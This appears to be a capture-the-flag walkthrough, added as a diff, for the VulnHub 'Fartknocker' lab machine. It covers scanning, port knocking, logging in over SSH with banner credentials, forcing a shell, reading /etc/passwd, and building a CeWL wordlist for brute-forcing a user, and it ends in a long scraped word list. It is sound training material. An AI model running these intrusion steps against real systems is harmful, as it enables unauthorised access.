@@ -1,0 +1,1615 @@
+URL : https://www.vulnhub.com/entry/tophatsec-fartknocker,115/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+
+ Currently scanning: 192.168.16.0/16   |   Screen View: Unique Hosts           
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.0.1     c4:a8:1d:2e:2d:1c    01    060   Unknown vendor               
+ 192.168.0.3     08:d4:0c:22:5c:ea    01    060   Unknown vendor               
+ 192.168.0.4     08:00:27:3d:0d:c8    01    060   CADMUS COMPUTER SYSTEMS  
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.4
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-04 06:36 EDT
+Nmap scan report for 192.168.0.4
+Host is up (0.00089s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:3D:0D:C8 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.89 ms 192.168.0.4
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.99 seconds
+
+Enumerating port 80
+3.) Run nikto on the URL
+root@kali:~# nikto -h 192.168.0.4
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.4
++ Target Hostname:    192.168.0.4
++ Target Port:        80
++ Start Time:         2015-08-04 06:36:54 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x68 0x5105a792cb1f8 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6604 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2015-08-04 06:37:34 (GMT-4) (40 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+4.) Open the IP address in the browser
+http://192.168.0.4/
+Download the pcap1.pcap
+We can see that connections to TCP ports 7000, 8000, 9000 and 8888 are made
+As there is a webserver running with no means of remote administration knockd service was possible
+
+So we try and connect to these ports using nc
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 7000
+(UNKNOWN) [192.168.0.4] 7000 (afs3-fileserver) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 8000
+(UNKNOWN) [192.168.0.4] 8000 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 9000
+(UNKNOWN) [192.168.0.4] 9000 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 8888
+(UNKNOWN) [192.168.0.4] 8888 (?) open
+/burgerworld/
+A new web directory opened up. Try accessing it with the browser.
+http://192.168.0.4/burgerworld/
+Download the pcap2.pcap
+In the pcap file we can see that connections to TCP 21, UDP 22, TCP 80 and 8080 are made.
+Then a connection was established to http-alt (port 8080) and data went back and fourth.
+
+Running the nmap scan against 8888
+root@kali:~# nmap -Pn -sS -sV -v -p 8888 192.168.0.4
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-04 07:05 EDT
+NSE: Loaded 29 scripts for scanning.
+Initiating ARP Ping Scan at 07:05
+Scanning 192.168.0.4 [1 port]
+Completed ARP Ping Scan at 07:05, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 07:05
+Completed Parallel DNS resolution of 1 host. at 07:05, 0.02s elapsed
+Initiating SYN Stealth Scan at 07:05
+Scanning 192.168.0.4 [1 port]
+Completed SYN Stealth Scan at 07:05, 0.00s elapsed (1 total ports)
+Initiating Service scan at 07:05
+NSE: Script scanning 192.168.0.4.
+Nmap scan report for 192.168.0.4
+Host is up (0.0010s latency).
+PORT     STATE  SERVICE        VERSION
+8888/tcp closed sun-answerbook
+MAC Address: 08:00:27:3D:0D:C8 (Cadmus Computer Systems)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
+           Raw packets sent: 2 (72B) | Rcvd: 2 (68B)
+		   
+Looking into the TCP stream in wireshark we get this
+
+                      MMMMMMM           MMMMMMH 
+                HMMMMM:::::::.MMMMMMMMMM:::::.TMM
+              MMMI:::::::::::::::::::MMH::::::::TM
+            MMIi::::::::::::.:::::::::::::::::::::MMMM
+           MT::::.::::::::::::::::::::::::::::::.::=T.IMMM
+         MMMi:::::::::::::::::::::::::::::::::::::::::::MT)MM
+     MMMI.:::::::::::::::::::::::::::::::::::::::::::.:::M= MM
+   XMXi::::::::::::::::::::::.:::::::::::::::::::::::::::::::=MM
+   MMi::::::::::::::::::::::::::::::::::::::::::::::::::.::..:=MMM
+  MM:MMT:::::::::.:::::::::::::::::.:::::::::::::::::::::::::::MiMM
+   MMM::::::::::::::::::.::::::::::::::::::::::::::.::::::::::.TM.MM
+   MMi::::::::::::::.::::::::::::::::::::::::::::::::::::::.:::.:: M
+   MM:::.::::::::::::::::::::::::::::::::.:.:::::::::::::::::::::: XM
+ MM:MT::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::XM
+IMM:::.::::::::::::::::::::::::::::::::::: :::::::::::::::::::::::.=M
+ MM::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: :::M
+ XMT:::::::::::::::::::::: ::::::::::::::::: : ::::::::::::::::::: iM
+   MiMi:::::::::: :::::::::::::::::::::::::::::::: ::::::::::::::.:IM
+     M::::::HH::::::::::::::::::::::::::::::::::::::::::::::::::::: M
+     MT:::::iM::::::::Hi:iXH:::ii::XH:::::::::::::.::::::::::::::.:.M
+      MX:::::iMX:i::::iMi:iMH::XH::Mi:::::::::::::::::::::::::::::: M
+        Mii::::HMH:::::iMH::MH=:MM=TMi::::::::::::::::::::::::::::::MM
+          MMMMMMMMMMMXTi:MMHi:HMMIMMMMii::::::::::::::::::::::::::::XM
+           XXOXMMT:. ::T= :IMMMMMMM=iXMii:::::::::::::::::::::::::: MM
+            MMMH:::.:::::::.::::.::::.:XMi::::::::::::::::::::::::::MM
+           XMM::.:.:..::..:.:.::.:.::: ::XMi::::::::::::::::::::::::MX
+          XMMT::::.:.::.::::.::.::::::::.::XH:::::::::::::::::::::: M
+          HMX::...:..::..:.:.::::::..... :::XX::::::::::::::.:::::. M
+          MM:::....:::::.::::::..:::::.:..:::HX::::::::::::::::::::=M
+          MX::::::::::::::::::::::..::::.:..::X::::::::::::::::::::IM
+         XMI..  .:.::....:..::::.:: ::...::.:.MH:::::::::::::::::.: M
+         MM:. ::..::....::.::::::....:.:...:..MT::.   ::::::::: :..IM
+         MM=:::::.::.:::::..::::.: .::..::..::Mi:::::::::::::::::: MM
+         MMI:::...:  .::..::::::.:::::::.::::TM:::::::::::::::::::=MO
+          MH.: .::::.::.. .:::::iLMXX=::::.:.Mi::::::: ::::::::::.MM
+          MX:.:..:: .:.:.:.: :MMM:::..:::::.HM:::: :::::::::::::.MM
+          MM:::...::....: ::IMT:::.:...:.::.MT::::::: ::::::::: MM
+           M=::..::::..:::MM:i:..::.:...: ::M:::: ::: ::::::::::MI
+           MH::: :.:.: MMMM=:::.:.:...:....iM::: ::::::  ::::::LM
+          MMMMT.::. ::TM:::::..::::::::.::.IM::::HH:::::::::::.MO
+           MM:LM::T:MT.:: .......:....:.:: TMMiXMT.MH:::.::::.:M=
+            M:. :::MMi:::MMMM=::::::.::..::=MMMMMMXMH:::.:::::MM
+           XMI: :..::=MX  :M::.......:...:::.MXTHM MH:::.: :.XM
+           MM XMMI IM    M   ................:: :MIIM:::::::MMO
+            MMXXMILM  .ML.= :.:::....:.:..::.:..:::MMT:::::TMM
+              MXMLMMMT::.:...:........ ....::.:.=.MMMM:::::MM
+              MHM=:: :.:::...::::.:...:.....:: =MMM==Mi::::M
+              MM=:::.......:.:.::.:.::...:.: ::  . ::=M:: MM
+             MMi:=XMMMi::::...:::::.::.:::::::::..: ::Mi:=MT
+            MM=:I::  :iMH==:::::.::.:::::::::::::::.::MT:XMT
+           MT=:=MMMMMMM=HM::::.::::::MMT=Mi::::::..:::MI=MM
+          M ::::::.=I= .MX:..: ::::.::MX::::.:::.:.  .XMMM
+         M:MMMMMMM=.::::  ::.::...:.MMIM::.:::.::..::::M
+                 M=:: : ::::.==XMMM:XMMM=:::.::.:.::::.M
+                 M=.IMMM )X   M  MMMMMM=:::..::..:::.::M
+                 MM  X  MMM:MMMMMMMMM=:::.:.:.. .:.::::M
+                  MIMMMMMMMMMMMMMMI::::::::.:::.:...:.:M
+                MMMMMMMMMMMMMX:.   .:..::....:...:::.:iM
+               MMMMMMMMMMI::::::.:.::...:....:.....:.:=M
+           MMMMMMMMMI:::::.:.. :.::.::..........:..:..:M
+            M=:  :..::..::.........::.......::.:.....: M
+             MMMi::::::.:.:==MMMMMMMMMT:.:.:::..:::..: OM
+               MM=::..: OMMMM         MMMT:::....:.::: :M
+                M=::::MM                MMI:::........:OM
+                 MMMMM                   MMH:::..::MMMMMM
+                                          MMMMMMMMMMMMMMM
+
+
+                     CAN YOU UNDERSTAND MY MESSAGE?!
+
+
+
+...  eins drei drei sieben
+This above string is 1337 in English
+Now try to connect to 1,3,3,7,1337 on the 192.168.0.4 using nc
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 1
+(UNKNOWN) [192.168.0.4] 1 (tcpmux) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 3
+(UNKNOWN) [192.168.0.4] 3 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 3
+(UNKNOWN) [192.168.0.4] 3 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 7
+(UNKNOWN) [192.168.0.4] 7 (echo) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 1337
+(UNKNOWN) [192.168.0.4] 1337 (?) open
+/iamcornholio/
+A new web directory opened up. Try accessing it with the browser.
+http://192.168.0.4/iamcornholio/
+We see an encodes string : T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK
+Decode using base64
+root@kali:~/Desktop/knock# cat decode.txt 
+T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK
+root@kali:~/Desktop/knock# base64 -d decode.txt 
+Open up SSH: 8888 9999 7777 6666
+
+So we try and connect to these ports using nc
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 8888
+(UNKNOWN) [192.168.0.4] 8888 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 9999
+(UNKNOWN) [192.168.0.4] 9999 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 7777
+(UNKNOWN) [192.168.0.4] 7777 (?) : Connection refused
+root@kali:~/Desktop/knock# nc -nv 192.168.0.4 6666
+(UNKNOWN) [192.168.0.4] 6666 (?) : Connection refused
+
+Running an nmap scan to see if any new ports are open
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.4
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-04 07:31 EDT
+Nmap scan report for 192.168.0.4
+Host is up (0.00097s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA)
+|   2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA)
+|_  256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=8/4%Time=55C0A2A2%P=i686-pc-linux-gnu%r(NULL,29
+SF:,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
+MAC Address: 08:00:27:3D:0D:C8 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.97 ms 192.168.0.4
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.24 seconds
+
+Enumerating port 22
+5.) Connect to port 22
+root@kali:~# ssh 192.168.0.4
+The authenticity of host '192.168.0.4 (192.168.0.4)' can't be established.
+ECDSA key fingerprint is fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.0.4' (ECDSA) to the list of known hosts.
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+root@192.168.0.4's password: 
+We can see the user-name and password in the banner
+
+Try connecting to SSH with the username butthead
+root@kali:~# ssh butthead@192.168.0.4
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+butthead@192.168.0.4's password: 
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+Last login: Tue Aug  4 07:36:33 2015 from 192.168.0.5
+You are only logging in for a split second! What do you do!
+Connection to 192.168.0.4 closed.
+The SSH connection is logged out immediately.
+
+Invoking SSH with /bin/bash
+root@kali:~# ssh butthead@192.168.0.4 /bin/bash
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+butthead@192.168.0.4's password: 
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ ls
+ls
+nachos
+$ cat nachos
+cat nachos
+Great job on getting this far.
+
+Can you login as beavis or root ?
+
+$ cat /etc/passwd | grep beavis
+cat /etc/passwd | grep beavis
+beavis:x:1000:1000:beavis,,,:/home/beavis:/bin/bash
+$ whoami
+whoami
+butthead
+$ sudo root
+sudo root
+[sudo] password for butthead: nachosrule
+
+butthead is not in the sudoers file.  This incident will be reported.
+$ whoami
+whoami
+butthead
+$ 
+
+We will construct a custom word-list using CEWL so that we can use that to brute force the "beavis" password
+root@kali:~/Desktop/knock# cewl -w custom_wordlist.txt -d 0 -m 7 https://en.wikipedia.org/wiki/Beavis_and_Butt-head
+CeWL 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)
+
+
+root@kali:~/Desktop/knock# cat custom_wordlist.txt 
+wikipedia
+headrft
+2004rfr
+mikejudge
+3ABeavis
+television
+Wikipedia
+Category
+bookrft
+Retrieved
+episodes
+America
+Television
+October
+articles
+American
+International
+aufirst
+Special
+Template
+Rolling
+episode
+Butthead
+3Ajournal
+articlerft
+Standard
+Eichler
+characters
+template
+27Beavis
+BookSources
+Articles
+article
+Virtual
+Stupidity
+Highland
+Angeles
+December
+Kristofor
+references
+Animation
+released
+mediawiki
+1997rft
+Animated
+February
+external
+needing
+Phoenix
+content
+original
+2Farticles
+animated
+Andyrft
+additional
+Collection
+Werewolves
+November
+Central
+Booksrft
+2Fentertainment
+Timesrft
+Morgendorffer
+interview
+created
+release
+identifiers
+Johnson
+WikiProject
+covered
+Baseball
+reporter
+English
+Exclusive
+culture
+revival
+animation
+Mobygames
+2011rft
+Baltimore
+Episodes
+Grandstaff
+followed
+revived
+Michael
+latimes
+Chicken
+another
+appearances
+Stonerft
+butthead
+Bunghole
+between
+ratings
+network
+u0026amp
+MusicBrainz
+cleanup
+Corprft
+However
+Original
+seconds
+January
+Related
+Archived
+cartoons
+Howardrft
+htmlrft
+Kristoforrft
+Festival
+million
+Leachman
+sections
+claimed
+Cartoon
+Paramount
+newspaper
+Cornholio
+2Fbeavis
+Jackass
+language
+Gregrft
+included
+working
+endings
+Silicon
+popular
+Rosenberg
+Infobox
+Experience
+earlier
+Greatest
+sometimes
+PlayStation
+Deathmatch
+Judgerft
+Discuss
+Larryrft
+Calling
+Thingies
+Understanding
+information
+character
+Simpsons
+Friends
+YouTube
+eventually
+672904535
+Entertainment
+releases
+actions
+Magazine
+Letterman
+Celebrity
+September
+California
+Problem
+criticism
+viewers
+mobygames
+section
+Authority
+Australia
+volumes
+History
+Hollings
+Bookrft
+Wreckers
+removed
+reception
+Support
+students
+2Fexclusive
+Stillman
+baltimoresun
+Grabianski
+Morality
+Characters
+Extract
+Maxtone
+against
+seasons
+inspired
+Production
+something
+producer
+2Ffeatures
+1994rft
+2014All
+laughing
+Windows
+Regular
+Genesis
+Privacy
+Sedelmaier
+Wikimedia
+Starpulse
+Greenerft
+disclaimer
+1993rft
+References
+wikimediaEvents
+Cartoons
+campaign
+function
+related
+including
+expanded
+Networks
+introduction
+segments
+titlecard
+featuring
+premiere
+According
+Pingback
+External
+rollingstone
+originally
+Thrasher
+Working
+designed
+Jeopardy
+Digital
+Surround
+Newsweek
+Episode
+Renewed
+feature
+Canceled
+Between
+Edition
+Continue
+Braxton
+Premise
+Reception
+Critical
+Criticism
+controversy
+Revival
+Highlights
+Seasons
+TVBroadwayWorld
+Greatness
+Keeping
+TELEVISION
+Kolbert
+certain
+uncouth
+pleasure
+Trapped
+boogers
+hysterical
+Goodbye
+Tvbythenumbers
+Premiere
+Presentation
+Presents
+Productions
+watching
+minutes
+Strauss
+Hotextra
+Robinson
+Internet
+Collected
+Database
+Reading
+Rheingold
+Official
+Ensucklopedia
+Archive
+Callaway
+obsession
+Comedians
+Hollywood
+Melcher
+Important
+Daughter
+Supersize
+available
+material
+features
+Bathroom
+scheduled
+Brothers
+containing
+improvised
+Volumes
+Station
+further
+adventure
+Downtown
+citations
+Undergrads
+Lawndale
+themselves
+Popzilla
+College
+featured
+positive
+SquarePants
+SpongeBob
+Adventures
+Mystery
+Planner
+Clueless
+Airheads
+Inferno
+Funhouse
+Saturday
+National
+Splendora
+Feature
+Idiocracy
+Anthrax
+Georgia
+creative
+intelligent
+Florida
+Crushin
+Lumbergh
+Paisley
+control
+include
+Generation
+creators
+Chandler
+compared
+critical
+Preprocessor
+supporting
+drinking
+history
+2097152
+expansion
+improve
+revision
+described
+identifiersWikipedia
+Nirvana
+Navigation
+behavior
+Catchphrases
+Megadeth
+Personal
+version
+visualEditor
+previously
+selling
+imageMetrics
+Foundation
+edition
+Moraine
+official
+networks
+regular
+audience
+globalCssJs
+interlanguage
+definition
+options
+watched
+implement
+Brownrft
+quality
+Doylerft
+1996rft
+subsequent
+airings
+announced
+presentation
+subject
+wikimedia
+writers
+previous
+Marcilrft
+Mikerft
+Championship
+28doodie
+Fighting
+preview
+Ultimate
+wikilove
+Toffler
+Robertrft
+autoconfirmed
+Stewart
+Danielrft
+Rosenbergrft
+Elizabethrft
+reprise
+nytimes
+2Fmovies
+reviews
+credited
+uncensored
+Kinnear
+Linklater
+segment
+cancellation
+programmes
+Satirical
+Richard
+Bogosian
+Zimmerman
+controversies
+broadcasting
+Obscenity
+Larkspur
+because
+firecracker
+programming
+Limbaugh
+immediately
+sitcoms
+20100803rft
+started
+occasion
+2Farticle
+Michaelrft
+country
+Oriental
+Postrft
+Anderson
+bowling
+Buffcoat
+Windowsrft
+Holland
+Democratic
+licenseesrft
+Tasharft
+encouraged
+however
+mandatory
+appears
+prosecutors
+resourceloader
+completely
+cartoon
+changes
+responded
+mention
+encyclopedia
+questions
+program
+Franklin
+Benjamin
+despised
+describes
+glasses
+answers
+listened
+explained
+continues
+leading
+thunderstorm
+blaming
+concludes
+parodies
+Strikes
+reminding
+Lightning
+defendant
+thoughtless
+destructive
+wienerheads
+changed
+expelled
+arrested
+possibly
+deported
+revealed
+rooftop
+opening
+dropped
+explosives
+Breakers
+influenced
+famously
+lambasted
+partially
+senator
+highway
+overpass
+subsequently
+running
+mispronounced
+Natalia
+calling
+Butthole
+believing
+ethnicity
+describing
+watchdog
+mispronunciation
+writing
+President
+Clinton
+Citizen
+responsible
+consistently
+Incognito
+student
+threatens
+advantage
+pretending
+exchange
+perpetrators
+obvious
+caricature
+lottery
+introduces
+savants
+happened
+subversively
+observations
+criticisms
+straight
+executive
+retired
+theaters
+fireworks
+cruelty
+allowed
+returned
+uncredited
+whether
+uncertain
+critics
+domestic
+produce
+spokesperson
+informed
+creating
+broadcasts
+recordings
+controversial
+permanently
+surprise
+criticize
+contemporary
+president
+altered
+entirely
+hypnotized
+pausing
+matches
+amateur
+forbidden
+biggest
+obviously
+updated
+Otherwise
+passions
+Altschuler
+formerly
+thinking
+reviving
+similar
+concluded
+actually
+convinced
+tenability
+artists
+promotional
+cinemas
+screening
+sounded
+delight
+loophole
+censorship
+neighbors
+fielded
+shortly
+bedroom
+programs
+definitely
+initially
+rumored
+temporarily
+debuted
+Because
+killing
+dwindled
+challenging
+lighter
+cigarette
+remained
+renewal
+brother
+decision
+demographic
+females
+looking
+mainland
+displays
+replacing
+launched
+limited
+chanting
+coincide
+Christmas
+syndication
+dangerous
+juvenile
+pitching
+mentioned
+demographics
+brought
+installments
+wrapped
+stopped
+interviews
+interested
+producing
+expressing
+interest
+burying
+documentary
+Collider
+favorite
+Another
+problem
+commitment
+bringing
+instead
+teenagers
+sitting
+thought
+contain
+trivial
+unrelated
+anybody
+reorganize
+explain
+listing
+deleting
+possible
+particular
+himself
+distinct
+Moreover
+resulted
+directed
+reduced
+Drozdowski
+acknowledge
+forcing
+crusade
+imitates
+repeatedly
+following
+massive
+explosion
+stupidity
+transformed
+imitate
+Daredevils
+stating
+reading
+entitled
+familiar
+Contest
+imagines
+modeling
+fashion
+imitating
+commented
+influence
+stupidly
+responds
+classic
+considered
+attention
+captured
+particularly
+portrayed
+crushing
+monster
+published
+monthly
+imprint
+variety
+reprinted
+editorial
+letters
+answered
+Instead
+reviewing
+reviewed
+describe
+Mistress
+vehicle
+repeated
+visually
+referenced
+numerous
+subversive
+cleverly
+defended
+magazine
+conservative
+conservatives
+society
+implied
+parodied
+combination
+reaction
+negative
+notable
+whatsoever
+classmate
+involved
+permission
+remorse
+Peckmann
+hometown
+consequences
+uranium
+altogether
+Neighborhood
+distributed
+teachers
+contained
+approximately
+selected
+Although
+presented
+complete
+handful
+compilations
+continued
+embarking
+depicts
+exclusively
+meaning
+remainder
+laserdisc
+Essential
+commentary
+sixteen
+Laserdisc
+through
+organisation
+critique
+interstitial
+cancelled
+approval
+mistakenly
+shelves
+recalled
+fetching
+condition
+websites
+rejected
+prepared
+without
+knowledge
+consent
+frequent
+compilation
+includes
+collections
+scatological
+interpreted
+remotely
+phrases
+whenever
+chuckle
+Keillor
+tendency
+signature
+experience
+Despite
+macabre
+violence
+Sonneborn
+associated
+usually
+separately
+encounter
+judgments
+exclaiming
+deeming
+activity
+regarding
+scruples
+empathy
+literate
+educated
+supervision
+apparent
+fictional
+delinquents
+wannabe
+teenage
+Elizabeth
+incompetent
+socially
+centers
+Journey
+Butting
+pleasers
+tvguide
+1071203
+Contents
+properties
+adapted
+concept
+develop
+Bowling
+Sitterson
+Coverage
+originated
+Website
+Followed
+Chronology
+Revived
+CamArruda
+Picture
+channel
+Release
+Distributor
+Development
+EatBlogAnddie
+Judgemental
+Homemade
+Pictures
+Ternion
+CraveOnline
+Slashfilm
+Industries
+Petersburg
+company
+licensees
+Running
+Producer
+Wikiquote
+quotations
+Terkuhle
+Executive
+EpisodeWorld
+Country
+Houston
+Chronicle
+introduce
+composer
+Directed
+McStein
+Johanson
+Written
+Created
+challenged
+Unsourced
+Twisted
+sources
+reliable
+verification
+aspects
+important
+overview
+accessible
+provide
+expanding
+present
+consider
+contents
+summarize
+adequately
+details
+Further
+WorldCat
+174282730
+n96020193
+f400d82a
+4f69e2f6137b
+production
+visited
+1000000
+generated
+1500000
+creation
+missing
+argument
+Highest
+discuss
+Expensive
+Transclusion
+multiple
+Reflist
+Multiple
+timestamp
+20150802144354
+navigation
+headoldid
+Categories
+head1993
+debuts1997
+endings1990s
+series2010s
+series2011
+endingsAmerican
+seriesTelevision
+JudgeAnimated
+sitcomsComics
+seriesEnglish
+programmingMarvel
+titlesMTV
+cartoonsObscenity
+controversiesSatirical
+programmesTelevision
+cancellationTelevision
+TexasLiquid
+TelevisionHidden
+categories
+linksArticles
+2011Articles
+2010Articles
+2014Wikipedia
+CentralNotice
+cleanupArticles
+WikifyArticles
+referencesInfobox
+pagesArticles
+2015Wikipedia
+csshover
+26wmf16
+bannerController
+accountLog
+Namespaces
+Article
+Variants
+pageContentsFeatured
+contentCurrent
+eventsRandom
+articleDonate
+WikipediaWikipedia
+Interaction
+HelpAbout
+WikipediaCommunity
+portalRecent
+changesContact
+hereRelated
+changesUpload
+fileSpecial
+pagesPermanent
+linkPage
+informationWikidata
+itemCite
+bookDownload
+PDFPrintable
+centralNotice
+Languages
+BoarischDanskDeutschEestiEspa
+aisBahasa
+IndonesiaItaliano
+MagyarNederlands
+lPolskiPortugu
+EnglishSuomiSvenska
+modified
+Creative
+Commons
+Attribution
+ShareAlike
+License
+interface
+registered
+trademark
+viewPageTarget
+centralautologin
+organization
+Disclaimers
+Contact
+Developers
+centralauth
+loading
+postEdit
+searchSuggest
+cirrusSearch
+loggingSchema
+bootstrap
+autostart
+eventLogging
+subscriber
+wikibits
+geoFeatures
+navigationTiming
+teahouse
+ReferenceTooltips
+WatchlistGreenIndicators
+charinsert
+refToolbar
+switcher
+targetLoader
+UniversalLanguageSelector
+eventlogger
+startup
+document
+u003Cscript
+watchToken
+modules
+scripts
+wgBackendResponseTime
+wgHostname
+Powered
+MediaWiki
+Summary
+Verifiability
+Introduction
+referencing
+musician
+patrolToken
+editToken
+Stereophonic
+Macabre
+Scatology
+b2706269305541eba923c165462b22c4
+Lighter
+Loophole
+Deported
+Nintendo
+syndrome
+appearance
+PRESERVE
+Adventure
+entertainment
+computer
+variant
+wgVisualEditorToolbarScrollOffset
+Q511726
+wgWikibaseItemId
+wgNoticeProject
+namespaces
+showcount
+hideprefix
+wgCategoryTreePageCategoryOptions
+wgStableRevisionId
+Coolrft
+pristine
+wgFlaggedRevsParams
+wgULSCurrentAutonym
+1995rft
+Mediarft
+Hollywoodrft
+wgULSAcceptLanguageList
+Keillorrft
+wgGatherPageImageThumbnail
+Grabianskirft
+Filesrft
+wgGatherShouldShowTutorial
+Sucksrft
+usePageDescriptions
+usePageImages
+Ensucklopediarft
+pageLanguageDir
+pageLanguageCode
+Stillmanrft
+wgVisualEditor
+wgBetaFeaturesFeatures
+Rheingoldrft
+Sonnebornrft
+Buttrft
+1998rft
+publish
+Thingsrft
+Headrft
+2005rft
+hidesig
+dialogs
+toolbar
+wgWikiEditorEnabledModules
+wgPoweredByHHVM
+2F1993293118
+creator
+recipient
+wgMediaViewerEnabledByDefault
+Straussrft
+wgMediaViewerOnClick
+wgRestrictionMove
+judgerft
+wgRestrictionEdit
+Televisionrft
+wgIsProbablyEditable
+Ceronerft
+festivalrft
+wgRelevantArticleId
+wgRelevantPageName
+57733rft
+2Ftvbythenumbers
+presents
+october
+2F99241
+27chick
+2F1997214087
+america
+groupierft
+2F1997332008
+nadirrft
+Enoughrft
+wgMonthNamesShort
+Kolbertrft
+wgMonthNames
+2Ftelevision
+keeping
+3DBeavis
+2520and
+2520Butt
+3Dcserft
+Firerft
+2Fquery
+2Ffullpage
+3D9F0CE2DF143EF933A25753C1A965958260rft
+wgDefaultDateFormat
+interviewrft
+2Fsonic
+2F9beavis
+wgDigitTransformTable
+Magazinerft
+wgSeparatorTransformTable
+wikitext
+wgPageContentModel
+wgPageContentLanguage
+wgBreakFrames
+wgCategories
+Highlandrft
+bookitemrft
+episodesrft
+wgUserGroups
+2C289100
+Newsrft
+Rebootrft
+wgUserName
+wgAction
+morgendorffer
+wgIsRedirect
+Starrrft
+PZVN8lcKHQYVIYx3xAJRtMrft
+wgIsArticle
+27Jersey
+Morerft
+2Fculture
+20110216rft
+geeksofdoom
+Doomrft
+rkh7KbcRacynfcvurR04oJrft
+filmthrasher
+CamArrudarft
+2Fwhats
+renewed
+canceled
+Staffrft
+eatbloganddie
+2F32549219391
+continue
+updaterft
+EatBlogAnddierft
+Braxtonrft
+20100911
+2C1263615
+storyrft
+Highlightsrft
+broadwayworld
+CENTRALs
+20121113rft
+Limborft
+craveonline
+2F628453
+trapped
+limborft
+CraveOnlinerft
+Slashfilmrft
+slashfilms
+beavisrft
+94Starpulse
+Blogrft
+starpulse
+2Findex
+screenrft
+wgArticleId
+wgRevisionId
+2Fwindows
+virtual
+stupidityrft
+wgCurRevisionId
+Centralrft
+hotextra
+2Fbandbcollectiblescomics
+27Daria
+morgendorfferrft
+wgTitle
+Robinsonrft
+2Fcontent
+2F23060rft
+Clubrft
+wgPageName
+Library
+Congress
+Control
+wgNamespaceNumber
+wgCanonicalSpecialPageName
+account
+wgCanonicalNamespace
+de1ab5287c9076b96eedd3f97a84a7b6
+Discussion
+protected
+versions
+browsing
+Featured
+background
+current
